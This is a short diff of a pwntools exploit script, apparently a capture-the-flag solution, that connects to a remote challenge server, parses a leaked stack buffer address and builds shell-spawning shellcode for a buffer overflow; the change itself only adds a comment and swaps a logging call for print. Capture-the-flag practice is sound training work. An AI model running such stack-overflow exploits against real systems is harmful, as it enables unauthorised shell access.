@@ -14,10 +14,11 @@ OFFSET_TO_RIP = 136
 
 #p = process(elf.path)
 p = remote('offsec.m0lecon.it', 13531)
+# the received line indicate the starting address of the buffer 
 leak_line = p.recvline_contains(b"secret:")
 buf_addr = int(leak_line.split(b"secret: ")[1].strip(), 16)
 #buf_addr = 0x7ffc989f42b0
-log.info(f"buf = {buf_addr:#x}")
+print(f"buf = {buf_addr:#x}")
 
 shellcode = asm(shellcraft.sh())
 
